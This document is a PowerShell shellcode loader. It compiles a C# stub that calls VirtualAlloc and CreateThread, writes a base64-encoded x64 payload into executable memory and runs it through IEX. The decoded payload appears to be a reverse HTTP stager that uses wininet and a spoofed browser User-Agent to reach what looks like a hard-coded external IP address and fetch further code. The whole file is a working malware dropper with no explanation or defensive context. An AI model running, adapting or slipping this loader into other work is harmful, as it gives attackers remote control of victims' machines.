Set-StrictMode -Version 2

$eicar = ''

$DoIt = @'
$assembly = @"
	using System;
	using System.Runtime.InteropServices;
	namespace inject {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$compiler = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters
$params.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$params.GenerateInMemory = $True
$result = $compiler.CompileAssemblyFromSource($params, $assembly)

[Byte[]]$var_code = [System.Convert]::FromBase64String("/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuFwRAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAmCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L2RUVk8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaABVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC81LjA7IE5QMDg7IE1BQVU7IE5QMDgpDQoAaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGVsbG8AaGUAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zQ5LjIzNC4zMy4yMzUAAAAAAA==")

$buffer = [inject.func]::VirtualAlloc(0, $var_code.Length + 1, [inject.func+AllocationType]::Reserve -bOr [inject.func+AllocationType]::Commit, [inject.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$buffer) { 
	$global:result = 3; 
	return 
}
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $buffer, $var_code.Length)
[IntPtr] $thread = [inject.func]::CreateThread(0, 0, $buffer, 0, 0, 0)
if ([Bool]!$thread) {
	$global:result = 7; 
	return 
}
$result2 = [inject.func]::WaitForSingleObject($thread, [inject.func+Time]::Infinite)
'@

If ([IntPtr]::size -eq 8) {
	IEX $DoIt
}
